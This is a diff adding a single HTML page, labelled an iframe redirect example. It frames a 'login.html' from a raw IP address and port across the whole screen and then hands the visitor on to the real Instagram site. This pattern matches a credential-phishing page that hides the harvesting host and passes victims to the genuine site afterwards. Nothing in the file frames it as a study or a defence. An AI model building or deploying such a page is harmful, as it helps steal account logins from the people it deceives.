@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iframe Redirect Example</title>
+    <style>
+        /* Basic CSS to make the iframe fill the entire viewport */
+        html, body {
+            height: 100%;
+            margin: 0;
+            overflow: hidden; /* Prevent scrolling on the main page */
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none; /* Remove default border */
+        }
+    </style>
+</head>
+<body>
+    <iframe src="http://128.127.104.138:61145/login.html" id="website-frame"></iframe>
+
+    <script>
+        const iframe = document.getElementById('website-frame');
+
+        // Listen for messages from the iframe
+        window.addEventListener('message', function(event) {
+            // Check if the message indicates a redirect to Instagram
+            if (event.data === 'redirectToInstagram') {
+                window.location.href = 'https://www.instagram.com';
+            }
+        });
+
+        // Function to periodically check the iframe's location
+        function checkIframe() {
+            try {
+                const currentUrl = iframe.contentWindow.location.href;
+
+                // If the current URL is Instagram, send a message to the parent
+                if (currentUrl.includes('instagram.com')) {
+                    iframe.contentWindow.postMessage('redirectToInstagram', '*');
+                }
+            } catch (e) {
+                // Cross-origin issue
+            }
+        }
+
+        // Set an interval to check the iframe URL every second
+        setInterval(checkIframe, 1000);
+    </script>
+</body>
+</html>
